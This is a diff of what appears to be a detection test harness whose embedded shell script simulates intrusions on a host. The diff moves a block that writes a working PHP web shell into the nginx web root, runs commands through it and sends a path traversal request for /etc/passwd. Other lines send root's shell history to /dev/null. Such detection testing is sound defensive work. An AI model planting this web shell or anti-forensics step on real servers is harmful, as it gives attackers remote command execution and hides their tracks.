@@ -120,6 +120,21 @@ sleep 2
 ss -tnH state established dst 169.254.169.254 | grep -q . || fail metadata
 ss -tnH state established dst 127.0.0.1:445 | grep -q . || fail directory
 pgrep -f 'R 127.0.0.1:2222' >/dev/null || fail ssh-tunnel-running
+# --- Web application (2.8) ---
+# A web shell dropped in the web root and used: it runs id and a shell as
+# the web account (the audit rules record them), and answers a request
+# carrying a path traversal.
+root=/usr/share/nginx/html
+[ -d /etc/nginx/sites-enabled ] && root=/var/www/html
+printf '%s\n' '<?php echo shell_exec($_GET["c"] ?? "id"); ?>' > "$root/cc-shell.php" \
+    || fail webshell
+for c in id 'uname%20-a' 'sh%20-c%20id'; do
+    curl -s -o /dev/null "http://127.0.0.1/cc-shell.php?c=$c" || fail webshell-request
+done
+curl -s -o /dev/null "http://127.0.0.1/cc-shell.php?c=id&f=../../etc/passwd" || true
+out=$(curl -s "http://127.0.0.1/cc-shell.php?c=id")
+case "$out" in *uid=*) ;; *) fail "webshell-run: ${out:0:200}" ;; esac
+sleep 3  # let auditd write the web shell's program starts
 # --- Anti-forensics (2.5) ---
 # Root's history sent to /dev/null.
 ln -sf /dev/null /root/.bash_history || fail history
@@ -173,21 +188,6 @@ for n in $(seq 1 150); do
         | runuser -u www-data -- /usr/sbin/sendmail "r$n@d$((n % 60)).invalid" || fail mail
 done
 sleep 30
-# --- Web application (2.8) ---
-# A web shell dropped in the web root and used: it runs id and a shell as
-# the web account (the audit rules record them), and answers a request
-# carrying a path traversal.
-root=/usr/share/nginx/html
-[ -d /etc/nginx/sites-enabled ] && root=/var/www/html
-printf '%s\n' '<?php echo shell_exec($_GET["c"] ?? "id"); ?>' > "$root/cc-shell.php" \
-    || fail webshell
-for c in id 'uname%20-a' 'sh%20-c%20id'; do
-    curl -s -o /dev/null "http://127.0.0.1/cc-shell.php?c=$c" || fail webshell-request
-done
-curl -s -o /dev/null "http://127.0.0.1/cc-shell.php?c=id&f=../../etc/passwd" || true
-out=$(curl -s "http://127.0.0.1/cc-shell.php?c=id")
-case "$out" in *uid=*) ;; *) fail "webshell-run: ${out:0:200}" ;; esac
-sleep 3
 """
 
 # Before the baseline: nginx set up to run PHP through PHP-FPM. Rocky's
@@ -282,7 +282,8 @@ def expectations(root_fingerprint: str) -> list[Expected]:
         Expected("mail from the web-server account", "mail.web_user", "www-data", "medium"),
         Expected("a burst of outgoing mail", "mail.volume", "deliveries attempted", "medium"),
         Expected("mail to many new domains", "mail.domains", "new domains", "medium"),
-        Expected("a web shell running programs", "web.worker_child", "", "high"),
+        # uname: only the web shell runs it as the web account.
+        Expected("a web shell running programs", "web.worker_child", "ran uname", "high"),
         Expected(
             "requests answered by the new web shell", "web.new_script_hit", "cc-shell.php", "high"
         ),
